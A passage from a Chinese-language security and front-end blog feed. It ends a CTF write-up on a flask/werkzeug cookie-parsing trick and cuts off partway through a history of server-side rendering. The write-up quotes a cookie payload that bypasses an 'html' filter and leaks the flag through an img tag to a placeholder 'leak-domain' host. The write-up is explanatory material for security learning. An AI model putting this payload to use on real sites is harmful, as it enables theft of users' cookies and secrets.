punctuation">"</span></span>  <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>70%<span class="token punctuation">"</span></span>  <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>500px<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就算控制了 html，也只能在 sandbox iframe 裡面，不能執行程式碼，也不是 same origin。但以往如果要偷 cookie 的話，基本上都需要先有 same-origin 的 XSS 才行。</p><p>而前端的部分可以設定 cookie，但會過濾掉 <code>html</code> 這個字，所以不讓你設定 html：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">saveSettings</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">settings</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">settings=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>settings<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">getSettings</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        s <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">delete</span> s<span class="token punctuation">.</span>html<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>d <span class="token operator">!=</span> d<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> d<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        window<span class="token punctuation">.</span>settings <span class="token operator">=</span> <span class="token function">getSettings</span><span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">saveSettings</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>settings<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">renderSettings</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>settings<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        window<span class="token punctuation">.</span>settings <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    window<span class="token punctuation">.</span>settings <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>settings<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那這題到底要怎麼解呢？這一切都與 werkzeug 解析 cookie 時的邏輯有關。</p><p>先來講如何繞過那個 html 的檢查，在 werkzeug 裡面如果你的 cookie value 是用 <code>&quot;&quot;</code> 包住的話，會先進行 decode，因此 <code>&quot;\150tml&quot;</code>  會被 decode 成 <code>&quot;html&quot;</code>，就可以繞過對於 html 關鍵字的檢查。</p><p>但繞過之後，要怎麼拿到 flag 呢？這就要用到 werkzeug 第二個解析 cookie 的特殊之處了。當 werkzeug 在解析 cookie 時，如果碰到 <code>&quot;</code> 時，就會解析到下一個 <code>&quot;</code> 為止。</p><p>舉例來說，假設 cookie 的內容是這樣：</p><pre class="line-numbers language-none"><code class="language-none">Cookie: cookie1&#x3D;&quot;abc; cookie2&#x3D;def&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最後得到的結果會是：<code>&quot;cookie1&quot;: &quot;abc; cookie2=def&quot;</code></p><p>也就是說，如果我們在 flag 的前後各夾一個 cookie，就可以讓 flag 包含在 html 裡面，讓 flag 的內容出現在 html 中，再用其他任何方式把 cookie 拿走，底下直接用作者的 payload：</p><pre class="line-numbers language-none"><code class="language-none">Cookie: settings&#x3D;&quot;&#123;\&quot;\150tml\&quot;: &quot;&lt;img src&#x3D;&#39;https:&#x2F;&#x2F;leak-domain&#x2F;?cookie&#x3D; ;flag&#x3D;GH&#123;FAKE_FLAG&#125;; settings&#x3D;&#39;&gt;\&quot;&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看完這題才突然想到以前 DiceCTF 2023 也出現過類似的題目，那時候是 jetty 有這個行為：<a href="https://blog.huli.tw/2023/03/26/dicectf-2023-writeup/#web-jnotes-6-solves">Web - jnotes (6 solves)</a>，看來搞不好還不少 web framework 有這個 parsing 行為。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;因為最近有點忙的關係，這兩三個月比較少打 CTF 了，但還是會在推特上看到一些有趣的題目。雖然沒時間打，但筆記還是要記的，沒記的話下次看到鐵定還是做不出來。&lt;/p&gt;
&lt;p&gt;這篇主要記一些網頁前端相關的題目，由於自己可能沒有實際下去解題，所以內容都是參考別人的筆記之後再記錄一些心得。&lt;/p&gt;
&lt;p&gt;關鍵字列表：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;copy paste XSS&lt;/li&gt;
&lt;li&gt;connection pool&lt;/li&gt;
&lt;li&gt;content type UTF16&lt;/li&gt;
&lt;li&gt;multipart&amp;#x2F;mixed&lt;/li&gt;
&lt;li&gt;Chrome DevTools Protocol&lt;/li&gt;
&lt;li&gt;new headless mode default download&lt;/li&gt;
&lt;li&gt;Scroll to Text Fragment (STTF)&lt;/li&gt;
&lt;li&gt;webVTT cue xsleak&lt;/li&gt;
&lt;li&gt;flask&amp;#x2F;werkzeug cookie parsing quirks&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>從歷史的角度探討多種 SSR（Server-side rendering）</title>
    <link href="https://blog.huli.tw/2023/11/27/server-side-rendering-ssr-and-isomorphic/"/>
    <id>https://blog.huli.tw/2023/11/27/server-side-rendering-ssr-and-isomorphic/</id>
    <published>2023-11-27T06:40:00.000Z</published>
    <updated>2023-11-27T13:37:25.045Z</updated>
    
    <content type="html"><![CDATA[<p>你知道嗎，當你跟朋友在討論 SSR 的時候，很有可能你們對 SSR 的認知其實是不一樣的。直接舉個例子，底下這幾種情境，你覺得哪些算是 SSR？</p><ol><li>由後端 PHP 產生畫面</li><li>前端是 React 寫成的 SPA，但後端如果偵測到搜尋引擎，就會切換另一種 template，輸出專門針對搜尋引擎的模板，而非 React 渲染出的頁面</li><li>前端是 React 寫成的 SPA，但透過 Prerender 先把頁面 render 成 HTML，再交給搜尋引擎（一般使用者依然是 SPA），跟上一個的差別是使用者跟搜尋引擎看到的畫面基本上一致</li><li>前端是 React 寫成的 SPA，在後端用 <code>renderToString</code> 把 React 渲染成字串，但是沒有資料，資料會在前端拿</li><li>前端是 React 寫成的 SPA，後端會針對每個 page 先呼叫 API 拿資料，拿完以後才呼叫 <code>renderToString</code> 輸出 HTML，在 client 端時會做 hydration 讓頁面可以互動</li></ol><p>有一種人認為只要是由後端產生出畫面，就叫做 SSR，所以 1 ~ 5 全部都是 SSR。也有一種人認為前端必須先是 SPA，此時搭配的後端才能叫做 SSR，所以 2~5 都是 SSR；而另一種人則認為 SSR 的重點是 hydration，所以只有 5（或是 45）是 SSR。</p><span id="more"></span><p>下圖是我自己在推特簡單調查的結果，可以看見意見確實是有分歧的：</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p1.png" alt="推特調查結果"></p><h2><span id="為什麼會有這篇文章">為什麼會有這篇文章？</span></h2><p>五年前的時候我就有寫過一篇文章在講 SPA 與 SSR：<a href="https://life.huli.tw/2018/05/04/introduction-mvc-spa-and-ssr-545c941669e9/">跟著小明一起搞懂技術名詞：MVC、SPA 與 SSR</a>，那時候的我跟現在的我想法是一致的。</p><p>「現在的我」指的是還沒完全整理好想法，正在寫這段前言，底下都還沒寫好的我，等寫完以後會在結尾處再講「之後的我」的想法。但總之呢，現在的我的想法是，「並不是所有從 Server 產生出畫面的方式都『適合』稱作 SSR」。</p><p>先來看一個假想情境：</p><p>A：欸，你們公司網頁是用什麼方式 render 啊？<br>B：就 SSR 啊<br>A：是喔，那你們是用什麼框架處理 SSR？<br>B：就普通 PHP 而已，沒有用框架，前端就 jQuery</p><p>再看一個：</p><p>A：最近在解 SSR 的問題搞到好煩，資料好難弄<br>B：還好吧，我們用 PHP 都用得滿順利的啊</p><p>雖然說 server-side rendering 這個詞從字面上來看，就是指由 server 進行渲染，所以要說 PHP 是 SSR 從字面上看沒什麼問題，但我認為重點是「為什麼需要 SSR 這個詞」？</p><p>我的理解是在 SPA 還不流行的年代，根本沒什麼東西是 CSR（Client-side rendering），所以根本也不需要 SSR 這個詞。那時你只會說：「我們公司用 PHP」，而不是說：「我們公司用 PHP 做 SSR」。</p><p>有點像是我問我朋友他買的便當多少錢時，他會回我：「100 塊」，而不是「100 塊新台幣」，因為我們都預設了幣值是新台幣，所以不用特別多此一舉。同理，那時候只有從 server render 這條路，所以根本不需要特別提什麼 SSR。</p><p>但是後來 SPA 盛行，許多東西開始變成 CSR，此時就會碰到只有 CSR 才會碰到的問題如 SEO 等等，這時候為了解決這些問題，勢必有些東西要讓 server 去處理，在這種狀況下，Server-side rendering 這個詞才產生了新的意義，變成了「為了解決 CSR 的問題，產生的 server 端解決方案」</p><p>因此，將 PHP 稱之為 SSR 沒也不行，但卻是沒有意義的。</p><p>就像是如果我們把「飲料」定義為「可以喝的液體」，那你能不能說酸辣湯也是一種飲料？照定義來看沒有問題，但當有人問你「最喜歡喝的飲料是什麼？」的時候，你會說酸辣湯嗎？應該不會，而我們也不會把酸辣湯稱之為是飲料。</p><p>同理，雖然 SSR 字面上的意思是那樣，PHP 這種傳統 server 輸出內容的方案也可以稱之為 SSR，但你不會這樣叫它。SSR 更適合拿來指涉的是「用來解決 SPA 問題的 server 端解決方案」。</p><p>寫到這裡我就開始好奇了，那是不是在 SPA 與 CSR 流行以前，SSR 這個詞真的很少被使用？如果是的話，那到底從什麼時候開始的？還有，我對 SSR 的認識基本上是從 React 開始，那難道更早的框架如 Angular、Ember 或甚至是 backbone 等等，都沒有這問題嗎？如果有的話，他們的解決方案又稱之為什麼？</p><p>於是我開始了一段要花費很多時間，討論的問題或許也沒這麼重要，但我自己很樂在其中的探索之路。</p><h2><span id="spa-是從什麼時候開始流行的">SPA 是從什麼時候開始流行的？</span></h2><p>前面有提過我的主張是：「SSR 一詞在 SPA 盛行後開始跟著流行起來，專門指涉處理 CSR 與 SPA 問題的 server 端解決方案」</p><p>而我認為 SPA 的發展與整個網頁前端的發展其實滿有關聯的，因此先帶大家回顧一下歷史吧！</p><p>1995 年 JavaScript 正式推出，而當時雖然 JavaScript 的功能沒有這麼成熟，但已經有其他的技術可以在網頁上跑一個應用程式起來，就是 Java Applet。</p><p>而 Flash 在 1996 年發布，早期 JavaScript 還沒這麼強大時，要做比較完整的網頁應用程式，應該都是透過 Java Applet 或是 Flash。</p><p>那要到什麼時候，JavaScript 才成熟到真的可以獨當一面，用它來寫一個網頁應用程式呢？這個答案會跟技術的發展有關，作為一個需要跟後端溝通的網頁應用程式，最需要的是什麼？</p><p>是一個現在已經跟空氣和水一樣存在的東西：XMLHttpRequest。</p><p>想要不換頁就能獨立運作並且與 server 溝通，XMLHttpRequest 是必要條件，必須先有 XMLHttpRequest 這個 API，才能不換頁就能與 server 交換資料。</p><p>不過在最剛開始的時候，並不是所有的瀏覽器都用 XMLHttpRequest，最早有這個概念的微軟用的是 ActiveXObject，從 2006 年第一版的 jQuery <a href="https://github.com/jquery/jquery/blob/1.0/src/ajax/ajax.js#L61">原始碼</a>就能驗證這件事：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// If IE is used, create a wrapper for the XMLHttpRequest object</span><span class="token keyword">if</span> <span class="token punctuation">(</span> jQuery<span class="token punctuation">.</span>browser<span class="token punctuation">.</span>msie <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> XMLHttpRequest <span class="token operator">==</span> <span class="token string">"undefined"</span> <span class="token punctuation">)</span>  <span class="token function-variable function">XMLHttpRequest</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span>      navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"MSIE 5"</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">?</span>        <span class="token string-property property">"Microsoft.XMLHTTP"</span> <span class="token operator">:</span> <span class="token string">"Msxml2.XMLHTTP"</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>講到了 XMLHttpRequest 之後，理所當然就會提到 Ajax，這個詞來自於 2005 年 2 月 18 日 Jesse James Garrett 發表的這篇文章：<a href="https://web.archive.org/web/20061107032631/http://www.adaptivepath.com/publications/essays/archives/000385.php">Ajax: A New Approach to Web Applications</a>，裡面描述了一種使用 HTML + CSS + DOM + XMLHttpRequest 的新型溝通模式，我認為就是 SPA 的雛型了</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p2.png" alt="ajax"></p><p>（圖片來自於上面提到的文章）</p><p>另外，在文章裡也有提到 XMLHttpRequest 與 Ajax 的不同之處：</p><blockquote><p>Q. Is Ajax just another name for XMLHttpRequest?<br>A. No. XMLHttpRequest is only part of the Ajax equation. XMLHttpRequest is the technical component that makes the asynchronous server communication possible; Ajax is our name for the overall approach described in the article, which relies not only on XMLHttpRequest, but on CSS, DOM, and other technologies.</p></blockquote><p>從歷史的資料看起來，微軟的 Outlook 似乎是最早提起並運用這些技術的產品，從 2000 年就開始了，但論起大量運用並讓這個名詞廣為人知的話，就屬 2004 ~ 2005 年左右的 Google 了。</p><p>而差不多在這個時期，JavaScript 的生態系也迎來了蓬勃的發展，出現了一堆 library 如 Prototype、Dojo Toolkit 以及 MooTools 等等，還有 2006 年誕生的 YUI（Yahoo! User Interface Library）以及至今靈壓依然存在的 jQuery，都讓網頁前端得到了更進一步的發展，2007 年也出現了 Ext JS 這種專門拿來寫網頁應用的框架。</p><p>雖然說這些函式庫們都讓寫網頁變得更加容易，但 SPA 在這個時候還沒有流行起來，而是要等到兩位大前輩的誕生。</p><p>2010 年 10 月 13 日，Backbone.js 釋出了第一個版本，而一週後的 10 月 20 日，則是 AngularJS 首次發佈的日子。</p><p>而過了一年之後，別的 SPA 前端框架也出現了，分別是 2011 年 12 月 8 日發布的 Ember.js，以及 2012 年 1 月 20 出現的 Meteor.js。</p><p>一般來說一個新的框架出現以後，大概至少都要過個半年一年左右才會真正流行起來，因此我認為 2011 以及 2012 這兩年是 SPA 興起的開端，但是該用什麼資料來佐證呢？</p><p>關鍵字搜尋趨勢一定程度代表了當時某些技術名詞的流行程度，從下圖可以看出來，SPA 一詞大概是從 2011、2012 年左右開始一路攀升，與我的推測吻合（但這個數據其實不太精確就是了，可我一時想不到更好的了）：</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p3.png" alt="SPA 搜尋趨勢"></p><p>（至於 2004、2005 那個高峰是什麼，我不知道，但很想知道的。或許跟一堆 Google 服務的流行有關？有線索的可以私訊或是留言討論）</p><p>之後的故事大家就比較熟悉了，2013 年 5 月 React 正式發佈，2014 年 2 月則是 Vue，隨著前端框架的盛行，SPA 也變得越來越流行，到了今天甚至變成了前端開發的主流。</p><h2><span id="早期的-spa-如何解決-csr-的問題">早期的 SPA 如何解決 CSR 的問題？</span></h2><p>從上面的發展史中可以得知開創 SPA 盛世的元老就屬 Backbone.js 以及 AngularJS 了，那他們是怎麼解決 CSR 的問題，例如說 SEO？</p><p>先來看 AngularJS 好了，我在 GitHub 上找到一個 2013 年的專案：<a href="https://github.com/runvnc/angular-on-server/tree/b84bcea97037adaffc83cf4869fe9a008c7db3a8">angular-on-server</a>，在 wiki 的前言中寫著：</p><blockquote><p>We need to pre-render pages on the server for Google to index. We don’t want to have to repeat ourselves on the back end. I found a few examples of server-side rendering for Backbone applications, but none showing how to do it with AngularJS. To make this work I have modified a couple of Node modules, jsdom and xmlhttprequest. They are loaded from local subdirectories (&#x2F;jsdom-with-xmlhttprequest and &#x2F;xmlhttprequest).</p></blockquote><p>如果他所言為真，就代表當時 AngularJS 的 SSR 解決方案並不多，大多數都是 Backbone.js 的。</p><p>從我找到的資料來看，似乎也是如此，像是這篇 2013 年的發問：<a href="https://stackoverflow.com/questions/16232631/angularjs-server-side-rendering">AngularJS - server-side rendering</a>，從回答中就可以看出解法確實不多。</p><p>而 AngularJS 官方正式支援 SSR，是要一直到 2015 年 6 月底的這個演講：<a href="https://www.youtube.com/watch?v=0wvZ7gakqV4">Angular 2 Server Rendering</a>，在演講結束後幾天後開源了 <a href="https://github.com/angular/universal/tree/e5b088ef4a59e59461fee31a21c2a81b742a7df5">Universal Angular 2</a>，也就是現在的 Angular Universal 的前身。</p><p>在當時的 README 中，說明寫著：</p><blockquote><p>Universal (isomorphic) JavaScript support for Angular 2</p></blockquote><p>看到 isomorphic 這個詞，應該勾起了不少人當年的回憶，但這個我們等等再談，先來看 Backbone.js 又是怎麼解決 SPA 問題的。</p><p>我有在 GitHub 上面找到一個 2011 年的古老範例：<a href="https://github.com/runemadsen/Backbone-With-Server-Side-Rendering">Backbone-With-Server-Side-Rendering</a>，README 寫著：</p><blockquote><p>Backbone.js is a great tool for organizing your javascript code into models, collections and views, without tying your data to the DOM elements. However, most tutorials show how to render the HTML only via Backbone (client-side), which means that none of your content is crawled by search engines. This is possibly a major problem if you’re not making an app hidden behind an authentication system.</p></blockquote><p>比較特別的地方在於這個專案的 SSR 是透過 Ruby on Rails 實作的，但我看了一下原始碼，感覺比較像一個實驗性質的專案，透過後端把HTML 輸出，接著到了前端再由 Backbone.js 接手，是一個簡單的小範例，而非完整的 demo。</p><p>如果想要更完整的解決方案，就屬 2013 年由 Airbnb 開源出來的 <a href="https://github.com/rendrjs/rendr">Rendr</a> 了。</p><p>在 2013 年 1 月 30 日，Airbnb 的技術部落格發表了一篇新的文章：<a href="https://web.archive.org/web/20130711035708/http://nerds.airbnb.com/weve-launched-our-first-nodejs-app-to-product/">Our First Node.js App: Backbone on the Client and Server</a>，裡面講到了 SPA 會有的問題，以及有許多邏輯在前後端都各有一份，想要做整合。而最後的解法就是 Rendr 這個套件，能把 Backbone.js 搬到 server 去執行。</p><p>至於 Rendr 的開源則是過了三個月以後的這篇文章宣布的：<a href="https://web.archive.org/web/20130623194723/http://nerds.airbnb.com/weve-open-sourced-rendr-run-your-backbonejs-a/">We’ve open sourced Rendr: Run your Backbone.js apps in the browser and Node.js</a>，裡面寫說：</p><blockquote><p>Many developers shared the same pain points with the traditional client-side MVC approach: poor pageload performance, lack of SEO, duplication of application logic, and context switching between languages. </p></blockquote><p>可見當時有大量的開發者也都意識到了 SPA 的問題，並且想要一個比較完善的解決方案。</p><p>想要把 Backbone.js 搬到 server 去執行，有個先決條件，那就是 server 要可以執行 JavaScript。</p><p>Node.js 是在 2009 年釋出的，而 Express 是在 2010 年底，NPM 則是 2011 年。2012 年中的時候 Node.js 還在 <a href="https://nodejs.org/en/blog/release/v0.8.0/">v0.8.0</a>，是很早期的階段。從現在回頭看，Node.js 開始被大量使用，應該就差不多是 2012 ~ 2013 開始的。</p><p>總之呢，從我找到的資料來看，或許最早被廣泛運用於 SSR 的 library 就是 2013 推出的 Rendr 了，它能夠做到的事情是「在一開始由 server-side render，但是到了 client-side 以後由 JavaScript 接手」，如同 Airbnb 的文章中寫到的：</p><blockquote><p>Your great new product can run on both sides of the wire, serving up real HTML on first pageload, but then kicking off a client-side JavaScript app.  In other words, the Holy Grail.</p></blockquote><p>底下這張圖就是所謂的 Holy Grail，取自 Airbnb 當初發表的文章：</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p4.png" alt="holy grail"></p><p>寫到這邊，整理一下時間軸以及我個人的猜測。</p><p>從 2010 年底 Backbone.js 釋出以後，SPA 開始變得逐漸流行起來，而大家也意識到了畫面在前端渲染會碰到的問題，因此開始各自實作起不同的解決方案，也就是 server-side rendering。</p><p>而 Backbone.js 一直到了 2013 年 Airbnb 開源了 Rendr 以後，才終於有了一個最理想的解法，那就是「首次渲染在 server side，而之後的話渲染都在 client side，並且 client 跟 server 是共用同一套程式碼」</p><p>「同一行程式碼既可以跑在 client 又可以跑在 server」，這個概念就是前面所提到的 isomorphic。</p><p>順帶一提，Ember.js 官方的 SSR 解法應該是要到 2014 年底的這篇：<a href="https://blog.emberjs.com/inside-fastboot-the-road-to-server-side-rendering/">Inside FastBoot: The Road to Server-Side Rendering</a></p><p>再補充一件事情，根據 <a href="https://blog.risingstack.com/the-history-of-react-js-on-a-timeline/">The History of React.js on a Timeline</a> 這篇文章，<a href="https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66">FaxJS</a> 是 React 的前身，而在 2011 年底開源的時候就有 server-side rendering 的 API，可以把元件渲染成 static HTML，並且在 client-side 把事件裝回去：<a href="https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66#optional-server-side-rendering">https://github.com/jordwalke/FaxJs/tree/5962e3a7268fc4fe0251631ec9d874f0c0f52b66#optional-server-side-rendering</a></p><h2><span id="isomorphic-javascript">Isomorphic JavaScript</span></h2><p>Isomorphic JavaScript 一詞來自於 Charlie Robbins 在 2011 年 10 月 18 日發表的文章：<a href="https://web.archive.org/web/20170703210112/https://blog.nodejitsu.com/scaling-isomorphic-javascript-code/">Scaling Isomorphic Javascript Code</a></p><p>文章中有提到了 Isomorphic 的定義：</p><blockquote><p>Javascript is now an isomorphic language. By isomorphic we mean that any given line of code (with notable exceptions) can execute both on the client and the server.</p></blockquote><p>而更多細節可以在 Airbnb 於 2013 年 11 月 12 日發布的這篇文章中找到：<a href="https://medium.com/airbnb-engineering/isomorphic-javascript-the-future-of-web-apps-10882b7a2ebc">Isomorphic JavaScript: The Future of Web Apps</a></p><p>在文章裡面還有附上了一個實際案例，很值得參考：<a href="https://github.com/spikebrehm/isomorphic-tutorial/tree/b54098ba61f4e766fee8c660e3d074c5eca07dfa">isomorphic-tutorial</a>。</p><p>除此之外，文章裡面有提到在 Rendr 之前還有三個 Isomorphic JavaScript 的先行者，一個是 2012 年 Yahoo! 開源的 <a href="https://web.archive.org/web/20130722082828/https://developer.yahoo.com/blogs/ydn/yahoo-mojito-now-open-source-52490.html">Mojito</a>，在文章中提到了一個美好的想像：</p><blockquote><p> Imagine a framework where the first page-load was always rendered server-side, and desktop browsers subsequently just made calls to API endpoints returning JSON or XML, and the client only rendered the changed portions of the page.</p></blockquote><p>基本上就是現在主流前端的運作方式。</p><p>另一個則是 Meteor.js，第三個是 Asana 的 <a href="https://web.archive.org/web/20110211193136/https://asana.com/luna">Luna</a>，這個 Luna 挺有趣的，仔細看之後發現語法有點 React 的味道。</p><p>而 Isomorphic 這個詞一直到 2015 年 Michael Jackson 的這篇文章出來以後，才漸漸被「Universal」給取代：<a href="https://medium.com/@mjackson/universal-javascript-4761051b7ae9">Universal JavaScript</a>。</p><p>這篇文章主要覺得比起 Isomorphic 這個詞，Universal 更能表達原本想表達的意涵，而且聽眾們會更容易理解，因此提倡用 Universal JavaScript 來替代 Isomorphic JavaScript。</p><h2><span id="中場總結">中場總結</span></h2><p>寫到這裡，我自己回答了我之前的幾個疑問：</p><blockquote><p>Q: 那是不是在 SPA 與 CSR 流行以前，SSR 這個詞真的很少被使用？如果是的話，那到底從什麼時候開始的？</p></blockquote><p>不確定，因為沒有特別找更早以前的資料佐證，但如果是看 SSR 這個詞的搜尋趨勢的話，大概是從 2012~2013 左右開始起飛的，跟 SPA 開始流行的時間點差不多。</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p5.png" alt="SSR 搜尋趨勢"></p><blockquote><p>Q: 我對 SSR 的認識基本上是從 React 開始，那難道更早的框架如 Angular、Ember 或甚至是 backbone 等等，都沒有這問題嗎？如果有的話，他們的解決方案又稱之為什麼？</p></blockquote><p>他們有相同的問題，而解法一樣稱之為 SSR。</p><p>說實在的，討論 SSR 這個名詞的明確定義確實沒什麼太大意義，反倒有點太鑽牛角尖了，而且也很難有個結論，或是說服別人：「這個定義才是對的」，只要在溝通的時候確保雙方的認知一致即可。</p><p>在談到 SSR 的時候，很多人都只關注到 SEO 的問題，但如果再更仔細想一點，其實需要利用 SSR 解決的，可不只有 SEO。</p><h2><span id="ssr-想解決的問題">SSR 想解決的問題</span></h2><p>SSR 想解決的問題，就是 CSR 會造成的問題，包括：</p><ol><li>SEO</li><li>各種社群平台的 link preview</li><li>Performance</li><li>使用者體驗</li></ol><p>如果用了 CSR，由於畫面都是透過 JavaScript 所產生，搜尋引擎只會爬到空白的 HTML，就算 Google 會執行 JavaScript，其他搜尋引擎也不一定會。就算所有搜尋引擎都會執行 JavaScript，你也很難保證爬出來的結果是你要的。</p><p>舉例來說，你很難掌握它們執行完 JavaScript 以後，到底什麼時候會結束。如果抓取資料的 API 要兩秒以後才會有 response，那假設搜尋引擎執行 JavaScript 以後只等一秒就當作最終結果，那結果還是不會有資料。</p><p>社群平台的 link preview 則是另一個問題，那些 <code>&lt;meta&gt;</code> 標籤在 client 產生是沒有用的，通常這些社群平台的 bot 是不會去執行 JavaScript 的，只看 response，所以 CSR 的頁面的 <code>&lt;meta&gt;</code> 永遠只能是同一個，沒辦法根據不同頁面動態決定內容。</p><p>第三點跟第四點可以一起看，雖然現在的裝置基本上都跑得很快，能夠快速執行 JavaScript，但不排除在 JavaScript 很大一包而且裝置比較舊的情況之下，執行 JavaScript 還是需要一段時間。</p><p>CSR 的網頁要到什麼時候使用者才能看到畫面？要先下載完 JavaScript，下載完還要執行，執行結束更新 DOM 以後，使用者才能看到完整的畫面。在等待的期間，畫面就是一片空白，雖然有些網站會做個 loading，但總之使用者體驗不是很好。</p><p>如果能在一開始的 response 就拿到畫面，那使用者體驗就會變好，效能也會增加，就算是很舊的裝置，也能在一開始就看到畫面，不需要等 JavaScript 執行完畢。</p><h2><span id="各種不同的-ssr">各種不同的 SSR</span></h2><p>其實這篇一開始只想寫這個段落的，殊不知寫著寫著就變成了前端歷史的考古文。</p><p>因應剛剛提到的 CSR 會產生的問題，就產生出了多種解法，每一種都不太一樣，而且並不一定能一次解決所有的問題。</p><h3><span id="第一種針對搜尋引擎以及-bot-渲染另一個模板">第一種：針對搜尋引擎以及 bot 渲染另一個模板</span></h3><p>這種解法只解了 SEO 跟 link preview 的問題，當 server 端收到的請求來自於搜尋引擎或是社群平台的 bot 時，就直接利用原本後端的 template 輸出結果。</p><p>像是這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token 